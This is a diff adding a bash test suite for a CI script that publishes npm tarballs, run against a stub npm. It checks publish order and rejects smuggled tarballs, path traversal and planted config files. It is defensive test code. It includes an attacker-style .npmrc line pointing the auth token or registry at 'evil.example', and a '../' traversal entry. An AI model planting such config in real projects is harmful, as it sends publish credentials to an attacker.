@@ -1,0 +1,186 @@
+#!/usr/bin/env bash
+# Exercises tools/ci/publish-packed-tarballs.sh against a stub `npm`, with no registry and no
+# token. That script is the only step in the release pipeline that holds a publish credential,
+# and it runs for real perhaps once a release — far too rare a feedback loop to find a
+# regression in. Its reject cases matter as much as its accept case: publishing in the wrong
+# ORDER, or publishing a tarball nobody declared, are both green-looking failures at the one
+# point in the pipeline that cannot be undone (`npm publish` has no re-push).
+set -uo pipefail
+
+SCRIPT="${1:-$(cd "$(dirname "$0")" && pwd)/publish-packed-tarballs.sh}"
+[ -x "$SCRIPT" ] || { echo "FAIL: $SCRIPT is not executable"; exit 1; }
+
+PASS=0
+FAIL=0
+
+check() { # name expected actual
+    if [ "$2" = "$3" ]; then
+        PASS=$((PASS + 1)); echo "ok   — $1"
+    else
+        FAIL=$((FAIL + 1)); echo "FAIL — $1 (expected '$2', got '$3')"
+    fi
+}
+
+STUB_DIR="$(mktemp -d)"
+WORK_ROOT="$(mktemp -d)"
+trap 'rm -rf "$STUB_DIR" "$WORK_ROOT"' EXIT
+mkdir -p "$STUB_DIR/bin"
+
+# `npm prefix` walks up for a package.json or a node_modules exactly as npm's own localPrefix
+# resolution does, so the guard in the script under test is exercised for real rather than
+# against a stub that always agrees with it. `npm publish` appends its argv to PUBLISH_LOG,
+# which is what the order assertions read.
+cat > "$STUB_DIR/bin/npm" <<'STUB'
+#!/usr/bin/env bash
+case "$1" in
+    prefix)
+        dir="$PWD"
+        while [ "$dir" != "/" ]; do
+            if [ -e "$dir/package.json" ] || [ -e "$dir/node_modules" ]; then
+                echo "$dir"; exit 0
+            fi
+            dir="$(dirname "$dir")"
+        done
+        echo "$PWD"
+        ;;
+    publish)
+        shift
+        echo "$*" >> "$PUBLISH_LOG"
+        if [ -n "${FAKE_PUBLISH_FAILS:-}" ]; then
+            echo 'stub-npm: publish failed' >&2; exit 1
+        fi
+        ;;
+    *)
+        echo "stub-npm: unexpected command: $*" >&2; exit 1
+        ;;
+esac
+STUB
+chmod +x "$STUB_DIR/bin/npm"
+export PATH="$STUB_DIR/bin:$PATH"
+
+# A fresh tarball directory with the given manifest lines, each also created as a real file
+# unless the name is prefixed with `!` (declared-but-absent).
+new_case() { # case-name manifest-line...
+    local dir="$WORK_ROOT/$1"
+    shift
+    mkdir -p "$dir"
+    : > "$dir/publish-order.txt"
+    local line
+    for line in "$@"; do
+        if [ "${line#!}" != "$line" ]; then
+            echo "${line#!}" >> "$dir/publish-order.txt"
+        else
+            echo "$line" >> "$dir/publish-order.txt"
+            echo 'tarball' > "$dir/$line"
+        fi
+    done
+    echo "$dir"
+}
+
+run_case() { # dir
+    PUBLISH_LOG="$WORK_ROOT/publish.log"
+    export PUBLISH_LOG
+    : > "$PUBLISH_LOG"
+    "$SCRIPT" "$1" > "$WORK_ROOT/out.log" 2>&1
+}
+
+# --- the accept case, and the property the split put at risk -------------------------------
+dir="$(new_case happy aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz aiqadam-qadams-common-0.14.1.tgz)"
+run_case "$dir"
+check "publishes three tarballs successfully" 0 $?
+check "publishes in manifest order, not alphabetical" \
+    "shared framework common" \
+    "$(sed -E 's#^\./aiqadam-(qadams-)?([a-z]+)-[0-9].*#\2#' "$WORK_ROOT/publish.log" | tr '\n' ' ' | sed 's/ $//')"
+check "passes the flags provenance needs" \
+    "3" \
+    "$(grep -c -- '--access public --tag latest --provenance' "$WORK_ROOT/publish.log")"
+
+# Alphabetical order would be common, framework, shared — assert the fixture could actually
+# have caught that, so the assertion above is not vacuous.
+check "the fixture's alphabetical order really does differ from its manifest order" \
+    "aiqadam-qadams-common-0.14.1.tgz" \
+    "$(cd "$dir" && ls ./*.tgz | head -1 | xargs basename)"
+
+# --- empty is success, absent is not -------------------------------------------------------
+dir="$(new_case empty)"
+run_case "$dir"
+check "an empty manifest is a green no-op" 0 $?
+check "and publishes nothing" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"
+
+dir="$(new_case missing-manifest aiqadam-shared-0.135.0.tgz)"
+rm "$dir/publish-order.txt"
+run_case "$dir"
+check "a missing manifest fails rather than publishing nothing quietly" 1 $?
+
+# --- the reject cases ----------------------------------------------------------------------
+dir="$(new_case declared-absent '!aiqadam-shared-0.135.0.tgz')"
+run_case "$dir"
+check "a manifest entry with no file fails" 1 $?
+
+dir="$(new_case undeclared-present aiqadam-shared-0.135.0.tgz)"
+echo 'tarball' > "$dir/aiqadam-smuggled-9.9.9.tgz"
+run_case "$dir"
+check "a tarball the manifest does not name fails" 1 $?
+check "and nothing was published before the refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"
+
+# The target is created deliberately: with it absent the existence check refuses the entry
+# first, and this case passes with the separator guard deleted — verified by mutation, which is
+# how it was caught. Only a resolvable path leaves the guard as the sole thing that can refuse.
+dir="$(new_case traversal '!../outside.tgz')"
+echo 'tarball' > "$WORK_ROOT/outside.tgz"
+run_case "$dir"
+check "a manifest entry containing a path separator fails" 1 $?
+check "and nothing was published before that refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"
+
+# npm falls back to the cwd for localPrefix when the walk up finds nothing, so a config file
+# planted in the tarball directory ITSELF is read as project config while `npm prefix` still
+# answers that directory and the prefix guard passes. app-sec demonstrated the consequence: an
+# .npmrc carrying `//evil.example/:_authToken=${NODE_AUTH_TOKEN}` sends the token to the
+# attacker's registry, with every guard green. The directory sweep is what closes it, so these
+# two cases are the ones that must fail if the sweep is ever narrowed back to `*.tgz`.
+dir="$(new_case planted-npmrc aiqadam-shared-0.135.0.tgz)"
+printf 'registry=https://evil.example/\n' > "$dir/.npmrc"
+run_case "$dir"
+check "an .npmrc planted in the tarball directory fails" 1 $?
+check "and the token never reaches a publish" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"
+
+dir="$(new_case planted-package-json aiqadam-shared-0.135.0.tgz)"
+echo '{"name":"smuggled"}' > "$dir/package.json"
+run_case "$dir"
+check "a package.json planted in the tarball directory fails" 1 $?
+
+dir="$(new_case project-config aiqadam-shared-0.135.0.tgz)"
+# The package.json goes in a parent of its OWN case directory, never in $WORK_ROOT: one placed
+# there would sit above every later case too, and each would fail this guard before reaching a
+# publish — silently turning the rest of the suite into assertions about the wrong refusal.
+mkdir -p "$WORK_ROOT/project-config-parent/tarballs"
+echo '{"name":"repo"}' > "$WORK_ROOT/project-config-parent/package.json"
+cp "$dir/publish-order.txt" "$WORK_ROOT/project-config-parent/tarballs/"
+cp "$dir/aiqadam-shared-0.135.0.tgz" "$WORK_ROOT/project-config-parent/tarballs/"
+run_case "$WORK_ROOT/project-config-parent/tarballs"
+check "a package.json above the tarballs fails — project .npmrc would outrank the auth config" 1 $?
+
+# --- a failed publish must stop, not continue down the manifest ----------------------------
+dir="$(new_case publish-fails aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
+FAKE_PUBLISH_FAILS=1 run_case "$dir"
+check "a failing publish exits non-zero" 1 $?
+check "and does not continue to the next package" "1" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"
+
+# --- the dist-tag is honoured --------------------------------------------------------------
+dir="$(new_case dist-tag aiqadam-shared-0.135.0.tgz)"
+NPM_DIST_TAG=next run_case "$dir"
+check "NPM_DIST_TAG is honoured" "1" "$(grep -c -- '--tag next' "$WORK_ROOT/publish.log")"
+
+# The manifest filename exists as a literal in both a TypeScript producer and a shell consumer,
+# which cannot import from each other. Nothing else would notice them drifting apart.
+REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
+ts_name="$(sed -n "s/^const PUBLISH_ORDER_FILENAME = '\\(.*\\)'.*/\\1/p" "$REPO_ROOT/tools/scripts/publish-framework-packages.ts")"
+sh_name="$(sed -n 's/^PUBLISH_ORDER_FILENAME="\(.*\)"$/\1/p' "$REPO_ROOT/tools/ci/publish-packed-tarballs.sh")"
+check "the producer and the consumer agree on the manifest filename" "$ts_name" "$sh_name"
+check "and that name is not empty (so the check above is not vacuous)" "publish-order.txt" "$ts_name"
+
+echo ""
+echo "=== Results ==="
+echo "Passed: $PASS"
+echo "Failed: $FAIL"
+[ "$FAIL" -eq 0 ]
